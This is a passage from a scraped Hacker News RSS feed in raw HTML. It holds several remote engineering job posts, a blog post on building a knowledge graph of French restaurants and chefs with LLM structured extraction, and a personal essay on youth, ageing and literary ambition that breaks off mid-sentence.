jobs@rinse.com, with the job title in the subject line.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243511"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243511" href="https://news.ycombinator.com/vote?id=43243511&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>GoGoGrandparent (YC S16) | FULLY REMOTE | Full-time | US, UK, or able to work 4+ hours overlap with mainland US | 3 x Senior/Staff Backend/Full-stack/Frontend Engineers | $90k-$150k</p><p>Build high-quality, robust engineering at the rarest of things - a Silicon Valley startup that is both wholesome AND profitable. We have 8-figure revenue, are YC-backed, and growing fast.</p><p>Tech stack (required): Back-end (Node, Typescript, MySQL, REST* / GraphQL), Front-end (Vue.js), deploy (AWS, Docker/K8s)</p><p>Minimum 5 years experience (with Node or Vue).</p><p>2-stage interview process.</p><p>If you want to help older adults and people with disabilities, send your LinkedIn/CV to william@gogograndparent.com (keep it brief) or apply at <a href="https://www.ycombinator.com/companies/gogograndparent/jobs">https://www.ycombinator.com/companies/gogograndparent/jobs</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243937"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243937" href="https://news.ycombinator.com/vote?id=43243937&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>August Health | Senior Backend Engineer | Remote, USA | Full Time | <a href="https://www.augusthealth.com/" rel="nofollow">https://www.augusthealth.com</a></p><p>We're a growth-stage (Series A in 2022) company that builds technology to enhance the quality of care for vulnerable older adults. Our product is guiding the transition from complex, paper-based practices in the long-term care industry to a digital platform solution that unlocks the power of personalized care, predictive analytics and happier caregivers. We're proud that we absolutely delight our customers: <a href="https://www.augusthealth.com/customer-testimonials" rel="nofollow">https://www.augusthealth.com/customer-testimonials</a>.</p><p>Our team brings together deep expertise in technology, healthcare, and company-building. We’ve led teams at Apple, Google, Landmark Health, and Adobe, co-founded and exited multiple companies, shipped products used by hundreds of millions of users, and managed clinical teams caring for thousands of patients.</p><p>Backed by top-tier Silicon Valley investors, we are partnering with some of the largest senior care organizations in the U.S. to transform the future of senior living.</p><p>Technologies we use: Scala, Play Framework, Protobuf, Kubernetes, Postgres. You don’t need to have specific experience in all of these, but the ability &amp; self-motivation to learn them is a must.</p><p>Please reach out to me (co-founder and CEO) at erez [at] augusthealth.com</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243116"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243116" href="https://news.ycombinator.com/vote?id=43243116&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Temporal Technologies | Multiple positions in United States - WORK FROM HOME | FULL-TIME |</p><p>Temporal offers an entirely new way to build scalable and reliable applications. Temporal enables developers to focus on writing important business logic, and not on managing state or worrying about the underlying infrastructure. Sequoia Capital led our last round of funding and our team has experience from start-ups and larger companies like Microsoft, Google, Amazon, Uber, and more.</p><p>Temporal Investors Expand Funding: <a href="https://temporal.io/news/temporal-investors-expand-funding-with-usd75m-round" rel="nofollow">https://temporal.io/news/temporal-investors-expand-funding-w...</a></p><p>Temporal in 7 minutes: <a href="https://temporal.io/tldr" rel="nofollow">https://temporal.io/tldr</a></p><p>We're looking for senior level engineers for multiple roles - see here - <a href="https://www.temporal.io/careers" rel="nofollow">https://www.temporal.io/careers</a></p><p>FEATURED ROLES:</p><p>Staff Solutions Architect - Growth → <a href="https://grnh.se/561cd8287us" rel="nofollow">https://grnh.se/561cd8287us</a></p><p>Senior Software Engineer, Cloud Developer Experience → <a href="https://grnh.se/e073b61c7us" rel="nofollow">https://grnh.se/e073b61c7us</a></p><p>Software Engineer II, Developer Productivity → <a href="https://grnh.se/b45d99ed7us" rel="nofollow">https://grnh.se/b45d99ed7us</a></p><p>US benefits include: Unlimited PTO, 12 Holidays + 2 Floating Holidays, 100% Premiums Coverage for Medical, Dental, and Vision, AD&amp;D, LT &amp; ST Disability and Life Insurance , Empower 401K Plan, Additional Perks for Learning &amp; Development, Lifestyle Spending, In-Home Office Setup, Professional Memberships, WFH Meals, Internet Stipend and more! Benefits outside the United States vary by country.</p><p>Apply here <a href="https://www.temporal.io/careers/" rel="nofollow">https://www.temporal.io/careers/</a></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43243850"><td></td></tr>
                  <tr id="43243598"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243598" href="https://news.ycombinator.com/vote?id=43243598&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Fulcrum | Senior and Staff Full Stack Engineer | MSP | $160k - 20k+ + benefits and equity | Full-time, REMOTE (US) or HYBRID (Minneapolis) | <a href="https://fulcrumpro.com/" rel="nofollow">https://fulcrumpro.com</a></p><p>Our mission is clear and staggeringly important: we're building the manufacturing operating system of the future from the ground up, one that’s engineered to create network effects as we grow. A beautiful, sophisticated quantum leap forward for the most important core industry in the world. The market tells us we’re on the right track and we're growing. Currently seventeen developers. (Many from HN!). Series A-2: <a href="https://fulcrumpro.com/ignite" rel="nofollow">https://fulcrumpro.com/ignite</a></p><p>We’re serious about doing great work and we empower people to make it happen. Our favorite tools include C#, Angular, Vue, and serverless TypeScript. We’re primarily interested in finding intensely smart people with talent at their fingertips, regardless of what tech stack you come from. We value autonomy over routine, and empathy over ego. We want to make products that are so elegant that our users feel constantly amazed. If you have at least 5 years of professional experience building all parts of modern webapps, and are interested in helping us develop the next generation of software in a massive market, we’d love to hear from you. The future is ours to build.</p><p>Answers to your FAQs: Immediate 401(k), with 5% match after 90 days through Vanguard, immediate vesting. health, dental, and vision benefits. Unlimited vacation (15 day mandatory minimums). Remote and flexible work. Typical process: culture screen - tech screen - tech interview - offer. To get in touch: careers@fulcrumpro.com or apply at <a href="https://fulcrumpro.com/team-careers" rel="nofollow">https://fulcrumpro.com/team-careers</a></p><p>Manifesto:
Manufacturing is important. It’s the fundamental industry on which everything else is built. We take it for granted. In 1989, 35% of the entire software industry was manufacturing systems. Back then, services, hand holding, customization, and consulting were necessary to get the systems to where they are today. What was the first massive burst in productivity from technology has stagnated into incremental diminishing returns and exponentially increasing complexity. We can only continue to add complexity for so much longer until the whole system collapses.
"Any intelligent fool can make things bigger and more complex. It takes a touch of genius and a lot of courage to move in the opposite direction."
Manufacturing is important. We must deliver a touch of technological genius to reintroduce simplicity, efficiency, and integration.</p><p>Investors: Besssemer, Battery, Bain, Schematic, Motivate
Advisors: Yishan (Reddit), Ara (ServiceTitan), Tooey (ProCore)</p></div></td></tr>
        </tbody></table></td></tr>
                      <tr id="43243910"><td></td></tr>
                <tr id="43243951"><td></td></tr>
                  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Knowledge graph of restaurants and chefs, built using LLMs (115 pts)]]></title>
            <link>https://theophilecantelob.re/blog/2025/foudinge/</link>
            <guid>43242818</guid>
            <pubDate>Mon, 03 Mar 2025 15:43:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://theophilecantelob.re/blog/2025/foudinge/">https://theophilecantelob.re/blog/2025/foudinge/</a>, See on <a href="https://news.ycombinator.com/item?id=43242818">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main">  <article> <div id="markdown-content"> <blockquote> <p><em>This post has been shared by .txt on <a href="https://www.linkedin.com/posts/dottxt_heres-an-impressive-real-world-application-activity-7301322258201923584-01K5?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAACOfhn4Byev3cgLMB0m80WAJqy6BUm_-NM4" rel="external nofollow noopener" target="_blank">Linkedin</a> and <a href="https://bsky.app/profile/dottxtai.bsky.social/post/3ljb5a7hriq2y" rel="external nofollow noopener" target="_blank">Bluesky</a>.</em></p> </blockquote> <p>For French restaurant intel, <a href="https://lefooding.com/" rel="external nofollow noopener" target="_blank">lefooding.com</a> is the definitive data source. Their anonymous critics conduct systematic reviews of establishments across France (and now Belgium), documenting their findings in a witty - if peculiar - style. Beyond choosing the place for a delicious night out, they can be used to map and understand France’s culinary network.</p> <p>A network is composed of nodes and edges. Nodes represent entities, such as people or restaurants. Edges represent the relationships between people and restaurants, or absence thereof. For the French restaurant scene, nodes represent both people and restaurants. A person node is connected to a restaurant if that person is known to have worked at the restaurant.</p> <p>Restaurants with very many neighbor nodes (nodes connected to it) are restaurants whose alumni go on to create and work in other prestigious restaurants. This is the case of <a href="https://www.ducasse-paris.com/" rel="external nofollow noopener" target="_blank">Ducasse</a> (ok, not a restaurant but a placeholder for all the restaurants in the Ducasse brand), <a href="https://www.mandarinoriental.com/fr" rel="external nofollow noopener" target="_blank">Mandarin Oriental</a> (technically the restaurant is called Sur Mesure) or <a href="https://www.septime-charonne.fr/" rel="external nofollow noopener" target="_blank">Septime</a>.</p> <p>To visualize and analyse this network, I combine information contained in reviews of restaurants across France by <a href="https://lefooding.com/" rel="external nofollow noopener" target="_blank">LeFooding.com</a>’s critics. Most reviews contain information about the staff and their CV.</p> <p>Take this (shortened) review of <a href="https://lefooding.com/restaurants/grenat" rel="external nofollow noopener" target="_blank">Grenat</a> (emphasis mine):</p> <blockquote> <p>À l’enseigne de Grenat, <strong>Antoine Joannier</strong> et <strong>Neil Mahatsry</strong> ont le rouge aux joues et aux murs. <strong>Après avoir officié à La Brasserie Communale, où ils se sont rencontrés</strong>, les deux compères font désormais feu de tout bois en plein centre de Marseille, où <strong>Antoine veille au grain autour des tables en bois blond, convoyant les plats que Neil embrase à tout-va depuis l’âtre derrière le comptoir</strong>. Des huîtres aux pièces viandardes, […]</p> </blockquote> <p>and LeFooding.com’s English version:</p> <blockquote> <p>At Grenat, <strong>Antoine Joannier</strong> and <strong>Neil Mahatsry</strong> are bathed in an ardent red glow, much like the pomegranate-toned walls of their space. <strong>After working together at La Brasserie Communale, where they first met</strong>, the duo is now firing on all cylinders in the heart of Marseille, where <strong>Antoine tends to guests seated around blonde wood tables, delivering dishes ignited by Neil behind the bar.</strong> From oysters to prime cuts of red meat, […]</p> </blockquote> <p>Notice that the review mentions the restaurant staff, their prior experience at <em>La Brasserie Communale</em> and gives their roles in the restaurant. All of this information should be included in the network. Using OpenAI’s gpt4o-mini model with its structured generation functionality, I can extract information from the 1800 publicly available <a href="https://lefooding.com/" rel="external nofollow noopener" target="_blank">LeFooding.com</a> reviews going back four years. Instead of the order of 1800 “current” staff-restaurant relationships, I uncovered over 5000 links, enriching our analysis with all possible information from the reviews.</p> <p>I combined the extracted information into a graph you can explore below (or <a href="https://ouestware.gitlab.io/retina/1.0.0-beta.4/#/graph/?url=https%3A%2F%2Fgist.githubusercontent.com%2Ftheophilec%2F351f17ece36477bc48438d5ec6d14b5a%2Fraw%2Ffa85a89541c953e8f00d6774fe42f8c4bd30fa47%2Fgraph.gexf&amp;r=x&amp;sa=re&amp;ca[]=t&amp;ca[]=ra-s&amp;st[]=u&amp;st[]=re&amp;ed=u" rel="external nofollow noopener" target="_blank">click here</a>) below. To get started in exploring look for <em>Grenat</em>, Antoine, Neil or <em>Septime</em> and other restaurants I’ve mentioned.</p> <p>The network has over 5000 nodes and as many edges. In the visualization, green nodes represent staff and purple nodes represent restaurants. Larger nodes have a higher degree (more neighbors). Edges link restaurants and staff. You can it below. Look for your favorite restaurant, or click around to discover the connected components in the graph.</p>  <h2 id="making-the-network">Making the network</h2> <p>To get here, I scraped data from <a href="https://lefooding.com/" rel="external nofollow noopener" target="_blank">LeFooding.com</a>, extracted the desired information from the reviews, built the graph and finally made the visualization. The code used is available at <a href="https://github.com/theophilec/foudinge" rel="external nofollow noopener" target="_blank">theophilec/foudinge</a>.</p> <p>The crux of the approach is extracting the information is a structured way. Indeed, I need an easy was of building the graph and knowing which restaurants and people are related. Large Language Models (LLMs) are excellent in understanding a text, and can answer questions like “Where did Antoine Joannier work before Grenat?” with the Grenat review. However, if we ask for the information is a structured format like a JSON object, they struggle to reliably give useful answers.</p> <p>For instance, the desired output for the Grenat review could be something like this:</p> <div><pre><code><span>Person</span><span>(</span>
  <span>name</span><span>=</span><span>'</span><span>Antoine Joannier</span><span>'</span><span>,</span>
  <span>role</span><span>=</span><span>'</span><span>Host</span><span>'</span><span>,</span>
  <span>previous_restaurants</span><span>=</span><span>[</span><span>'</span><span>La Brasserie Communale</span><span>'</span><span>]</span>
<span>)</span>

<span>Person</span><span>(</span>
  <span>name</span><span>=</span><span>'</span><span>Neil Mahatsry</span><span>'</span><span>,</span>
  <span>role</span><span>=</span><span>'</span><span>Chef</span><span>'</span><span>,</span>
  <span>previous_restaurants</span><span>=</span><span>[</span><span>'</span><span>La Brasserie Communale</span><span>'</span><span>]</span>
<span>)</span>
</code></pre></div> <p>This is the art of <em>structured generation</em>.</p> <p>There are several approaches to this problem. First, one can <em>prompt better</em>. Second, and in combination with the first approach, one can retry inference until the response parses in the desired schema. While this can work as a one-off when hacking a configuration file, it won’t work for almost 2000 reviews.</p> <p>Another approach uses the logits of the model. These define the sampling distributions for the next token. They can be modified at inference to force the generated tokens to build into a response respecting a defined structure. Behind the scences, this relies on regular expressions and finite state machines (the same techniques used when <em>parsing</em> JSON). When using such techniques, you prompt the model however you want (and give the schema to inference API) and the output provably respects the desired structure 100% of the time, and can be used reliably downstream.</p> <p>The <code>outlines</code> library built by <a href="https://dottxt.co/" rel="external nofollow noopener" target="_blank">.txt</a> makes this possible for your favorite open model, such as <code>Mistral-7B-v0.3</code>. It also wraps OpenAI’s implementation of this in its API.</p> <p>Once a <a href="https://github.com/theophilec/foudinge/blob/main/foudinge/entities.py" rel="external nofollow noopener" target="_blank"><code>prompt_template</code></a> and <a href="https://github.com/theophilec/foudinge/blob/main/foudinge/entities.py" rel="external nofollow noopener" target="_blank"><code>Summary</code> schema</a> are designed, it’s as easy as:</p> <div><pre><code><span>model</span> <span>=</span> <span>...</span>
<span>generator</span> <span>=</span> <span>outlines</span><span>.</span><span>generate</span><span>.</span><span>json</span><span>(</span><span>model</span><span>,</span> <span>Summary</span><span>)</span>
<span>result</span> <span>=</span> <span>generator</span><span>(</span><span>prompt_template</span><span>(</span><span>text</span><span>))</span>
</code></pre></div> <p>I put Mistral, Meta and OpenAI head to head. Both Llama3.2-3B and Mistral-7B-v0.3 had a tendency to hallucinate fake people and related restaurants. In the end, I opted for OpenAI gpt4o-mini, which was also much faster. But even gpt4o-mini was susceptible to mistakes, which makes me optimistic that better prompting, an improved schema design will allow me to reproduce the results with Mistral or Llama (future work).</p> <p>The total cost of inference over 2000 reviews with gpt4o-mini with its structured generation endpoint is less that 1€!</p> <p>I used <a href="https://gephi.org/gephi-lite" rel="external nofollow noopener" target="_blank">gephi-lite</a> to create work on the visualization. The key step was spatialization, which defines a spatial layout of the graph that makes sense given the information contained in the graph. In our case, I used the force simulation setting which sends connected nodes close and nodes with larger degree to the center. The embedded visualization runs using WebGL thanks to the <a href="https://ouestware.gitlab.io/retina" rel="external nofollow noopener" target="_blank">Retina</a> project<sup id="fnref:1"><a href="#fn:1" rel="footnote" role="doc-noteref">1</a></sup></p> <p>In order to handle duplicates and eliminating some obvious errors visible on the graph once visualized I asked Claude 3.7 Sonnet to create a simple web app to allow me to edit the inferred entities while keeping the structure intact (as well as the encoding issues caused by sqlite/myself). It only took 2 iterations to get it working as I wanted, and then a few more iterations to get full-text search and some other features. It uses Flask and pure JS in jinja templates. It is available on Github at <a href="https://github.com/theophilec/foudinge-scrub" rel="external nofollow noopener" target="_blank"><code>foudinge-scrub</code></a> There are still a few duplicates to fix, which I’ll get around to (maybe).</p> <p>All the code used for scraping (using sqlite, asyncio and aiohttp), the inference (using outlines), the prompt and the Pydantic Schema are available on Github at <a href="https://github.com/theophilec/foudinge" rel="external nofollow noopener" target="_blank">theophilec/foudinge</a>.</p> <h3 id="conclusion">Conclusion</h3> <p>This project illustrates how LLMs can be used to extract information from rich sources of textual data, in this instance restaurant reviews. I am very happy with the tools I chose. A good next step is to get all this running of open models, locally or in a public cloud.</p> <p><em>Thanks to Adrien Bocquet and Clotilde Bukato for proofreading earlier versions of this post.</em></p>  </div> </article> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Youth and what happens when it's gone (278 pts)]]></title>
            <link>https://tolstoyan.substack.com/p/youth</link>
            <guid>43242815</guid>
            <pubDate>Mon, 03 Mar 2025 15:43:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tolstoyan.substack.com/p/youth">https://tolstoyan.substack.com/p/youth</a>, See on <a href="https://news.ycombinator.com/item?id=43242815">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif" width="1456" height="1048" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/fae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1048,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2050210,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/gif&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffae08d5a-62dd-4f45-9c12-3a79e91ff597_1456x1048.gif 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><strong>When he was in his early-20s, he hung a timeline above his desk.</strong><span> He had drawn it himself, meticulously, with a ruler and professional illustration pen. It spanned from 18 to 30, and he glue-sticked little pictures of his favorite authors next to the age at which they’d published their first novels. At 21, Bret Easton Ellis</span><em>.</em><span> At 24, Martin Amis. At 25, Michael Chabon and Zadie Smith. At 26, Philip Roth. At 27, John Updike. He cut out a picture of his own face, and stuck it to the timeline among them. Every year, on his birthday, he moved his face one spot forward. Every year, he passed another one of his idols.</span></p><p><span>All of the writers he admired were considered (at one time, at least) exceptional young writers, and he wanted nothing more than to be like them: an exceptional young</span><em> </em><span>writer. Writing a book, in and of itself, mattered less to him than doing it at a supernaturally young age. To be a prodigy, a wunderkind—that’s what aroused his ambitions. From the blurry vantage of Youth, failing to publish a novel before his 30</span><sup>th</sup><span> birthday would be his life’s ultimate failure.</span></p><p>And, ultimately, he failed. He turned 30, then 31, and had nowhere to stick his cut-out face.</p><p><strong>To do a thing young is a shortcut to greatness.</strong><span> Everything you do right is evidence of your great potential, and all your mistakes are the mistakes of inexperience, which will be corrected, surely, by the passing of time. To write a poor sentence at the age of nineteen is expected (and quickly forgiven). To write a poor sentence at the age of forty-five—shouldn’t you know better by now? In this manner, being a not-young writer is a lose-lose proposition, because this principle applies to brilliant sentences, too. In youth, they are a marvel; later, they’re table stakes. </span><em>Couples</em><span>, which John Updike wrote when he was thirty-six, is considered one of his great accomplishments. But </span><em>Villages</em><span>, which he wrote at the age of seventy-two, is just as good. But of course it’s good—it was written by the guy who wrote </span><em>Couples</em><span>!</span></p><p>The years that pass eat up your margin for error until there is no margin left. The mistakes you make are no longer flaws of inexperience, they are flaws of character. To be young is to be constantly on the precipice of perfection – just a little further and you’ll get there – but you never get there, and suddenly you’re old, and find yourself in a permanent state of imperfection, which you must reckon with.</p><p><strong>He managed to finish two novels before he turned twenty-five.</strong><span> Neither were published. Neither were “good”—they were a young person’s novels: overbearing, self-conscious, sloppy, prideful, subpar imitations of the kind of books exceptional young writers wrote. One of his unpublished novels was about a seven-year-old boy who writes an elaborate science-fiction thriller in his school notebook, and when the manuscript is discovered by his teacher, he is skipped ahead a grade, and there encounters all the familiar plot points you’d expect in a coming-of-age story: bullies, crushes, etc.</span></p><p>He never realized what a naked parallel that story was for his own ambitions: to be rewarded with advancement, not necessarily for the thing he did, but for how young he was when he did it. It wasn’t a specific accomplishment he’d invested all his pride and hope in, but a specific condition in which that accomplishment would be achieved. </p><p><span>And then, one day, that condition expired. He was no longer young, and therefore no longer a young writer, and therefore would never be an exceptional </span><em>young</em><span> writer.</span></p><p><span>But still, and yet, even so – contrary to all logic and in total disregard of quantum law – it remained his goal: to be a young writer, and to be discovered. The problem is: no one wants to discover a 45-year-old. 45-year-olds aren’t discovered, they’re </span><em>uncovered</em><span>, like toxic waste, or a political scandal, or the murderer at the end of an Agatha Christie book. </span><em>My god, that 45-year-old was lurking among us this entire time!</em></p><p><span>(</span><strong>And the 55 year-olds are saying: forty-five? </strong><span>That’s nothing! Quit complaining! But one cannot choose the age at which they feel old, just like you can’t help feeling cold when the temperature drops. Winter comes whether you choose to acknowledge it or not. So do birthdays. Just ask Virginia Woolf, who, at the age of fifty, wrote in her diary: “</span><em>I don't believe in ageing. I believe in forever altering one's aspect to the sun. Hence my optimism. And to alter now, cleanly and sanely, I want to shuffle off this loose living randomness: people; reviews; fame; all the glittering scales; and be withdrawn, and concentrated.</em><span>” </span></p><p>Nine years later, Virginia walked into a pond with her pockets full of rocks, shuffling off her loose living randomness, permanently altering her aspect to the sun. Was this an act of optimism? Was this the response of someone eager to venture forth into the dark territory past the penumbra of youth?)</p><p><strong>Post-Youth, he began reading books about The Second World War</strong><span>, and Ancient Greece, and the American Civil War, and Quantum Physics, and The History of The Universe, and took solace in the immensity of the world.</span></p><p><span>Why does one develop an interest in history later in life? Is it a dawning realization that we are stuck in our particular moment in time, forever to know only this one small sliver of history? It’s a bit like that with everything</span><em> </em><span>we experience: as the years pile on, we realize how narrowly we touch the world. Is that why retirees like to travel? These tour groups where old folks disembark slowly from buses – stair by stair, feet turned sideways – to explore ancient ruins for twenty minutes at a time? An attempt to cram in as much of the world as possible before it’s taken away from them?</span></p><p><span>In his youth, he vacationed differently. Everywhere he went was a place he could live, a potential future life. He could live </span><em>here</em><span>, he’d tell himself. Or he could meet a woman </span><em>there</em><span>, and start a family </span><em>there</em><span>, and become a citizen of </span><em>that</em><span> place. Mexico, Hong Kong, France, Italy, Western Indiana, etc. </span></p><p>Eventually, he met a woman and chose a place – the best woman and the best place – and his future was fixed. The world was good, but the world was no longer full of all these possibilities. What, then, fills the void where possibility once lived?</p><p><strong>In Youth, you fantasize about one day meeting your idols.</strong><span> You imagine yourself standing behind them in line at a coffee shop, gathering the courage to tap them on the shoulder, tripping over your tongue to tell them what their work has meant to you. In these imagined scenarios you are always still young, still an up-and-comer, still undiscovered and hiding within you the potential for galactic greatness, but then you get old, and now must imagine yourself in line at Au Bon Pain, tearful and sputtering praise at Zadie Smith, who is, in fact, only three years older than you, and what a creepy interaction that would be! A 45 year-old, fawning like that—repulsive, pathetic!</span></p><p>That’s how it feels, most of the time, to no longer be young: pathetic, repulsive.</p><p><strong>When you think of being young</strong><span> – when you think of Youth as a state of being – you might think about being twelve years-old and watching the opening credits of </span><em>Silence of the Lambs</em><span> on the VHS tape you bought secondhand at the video store with your allowance money. This might be a singular moment you’ve plucked from your brain (a specific time, a specific place) or perhaps a composite memory of all the times you watched </span><em>Silence of the Lamb</em><span>s throughout your pre-teen and teenage years, when you were probably too young to be watching it at all.</span></p><p>In that opening sequence, which you’ve seen a million times, Clarice Starling is running through the woods at the FBI training camp. She’s wearing a gray jogging suit. It’s autumn, the image is washed out, the credits are in black typeface. Moody music plays.</p><p><span>In Youth, you watched this and felt hundreds of feelings, imagined hundreds of futures. Swimming within you were all the serial killer stories you’d one day write, that would be turned into movies just like this, and orbiting just outside the atmosphere of your comprehension (but still in view) were all the unknowable details of the grown-up world you’d one day inhabit, all the ambitious and slightly masculine women in jogging suits you might one day meet and perhaps marry. You experienced the opening credits of </span><em>Silence of the Lambs </em><span>in a manner that was completely unique to your position in the world, which was: you were young and could do anything.</span></p><p><span>But today, when you watch that same sequence – on the television in your hotel room during a work trip to Newark, let’s say – you might find it representative, instead, of all the serial killer stories you </span><em>didn’t</em><span> write, and you might be cowed by all the knowledge now within your grasp about how hard it is to write a story in the first place, and how much Thomas Harris – who wrote the novel the movie was based on – hated the process of writing, how torturous is was for him, how much he suffered in front of the keyboard, and you might fear that you share the same psychological trait, that you might never take joy in sitting at a desk, just a shadow of joy, just a foolish hope for future joy, just a lottery ticket with trillion-to-one odds of winning joy. You might even think about Ted Tally, the writer who adapted Harris’ novel, who won an Oscar for it, who never found much success after that, and you might wonder where he is now, what he’s doing, and you might be disappoined that you never got a chance to meet him, the guy who penned all those oft-quoted Hannibal Lecter lines (even though they’re less quoted, now, than they used to be—culture, too, loses its Youth). You might even feel melancholy about all the ambitious and slightly masculine women you didn’t meet, or who you met and failed to charm, who mistook your gestures of affection for mockery and were offended, who couldn’t see that you were more like them than they were willing to admit: slightly masculine, and ambitious.</span></p><p>Yes, you might watch the first five minutes of this particular movie and reminisce (fondly, even) about all your illusions about the grown-up world and how the grown-up world laughed as it shattered them.</p><p><strong>He published a novel, eventually.</strong><span> It came out on his 37</span><sup>th</sup><span> birthday. Ten years later than Updike, thirteen later than Amis, fifteen later than Ellis. All debuts, by definition, feel like youthful acts, and so did his. But writing a book at thirty-seven earns you no extra credit—no one grades on a curve, no one is charmed by your precociousness. It was just another book written by a 37-year-old. A book that was not bad, maybe kinda okay, but definitely not great, because if it was great, why did it take him until he was thirty-seven to write it?</span></p><p><strong>But it’s not just your own Youth that you mourn.</strong><span> You have kids, eventually, and must watch their Youth expire, too—slowly leaking out of them, day by day, relentlessly, invisibly, like a cracked tire, like a party balloon you find weeks later behind the couch.</span></p><p>You might cry inexplicably when you pass down their too-small snowsuits to neighbours. You might be irrationally angry when you find out that your spouse has donated to charity all the board books you once read at bedtime. You might attend your 4-year-old daughter’s ballet recital, and, sitting in the dark auditorium, watching all the little bodies fumble sweetly across the stage, find yourself suddenly overwhelmed by thoughts of all the things that will inevitably happen to those bodies – the good and bad things, the pain and elation, the self-disgust and attempts at self-refinement – and you might feel a deep and disorienting sadness, a throbbing bubble in your stomach, which is the inverse of the comfortable smallness you feel when you read books about The History of The Universe. It’s a feeling akin to dread, and the thing you’re dreading (you’ll realize) is this: that Youth exists only so that it can be destroyed.</p><p><span>Even as you celebrate the milestones of their personhood – as they walk, and talk, and read, and order meals at a restaurant, and bake banana loaf with hardly any help, and start writing down their secret thoughts in a journal you come across while putting away their laundry and can’t stop yourself from reading – you still want your kids to maintain their Youth for as long as possible, to believe in the Tooth Fairy, to be scared of ghosts, to love dinosaurs, to hold on to their innocence even though you know that the longer they hold on, the more it will hurt them to lose it. And they </span><em>will</em><span> lose it, you can’t stop it, just like you can’t stop their hair from growing or their hearts from being broken.</span></p><p>So you watch your kids closely. You watch them sleep. You watch them watching the opening credits of a movie they’re too young for and wonder what they’re imagining about the world, about themselves, about the silly dreams coalescing in their heads, and if, when they watch those opening credits again, decades from now – preferably anywhere but a hotel in Newark – they’ll mourn their Youth and the silly dreams it conjured.</p><p><strong>But this silly desire to be an exceptional young writer wasn’t egoistic craving.</strong><span> It was a biological obligation. He couldn’t help it. He couldn’t turn it off. Even 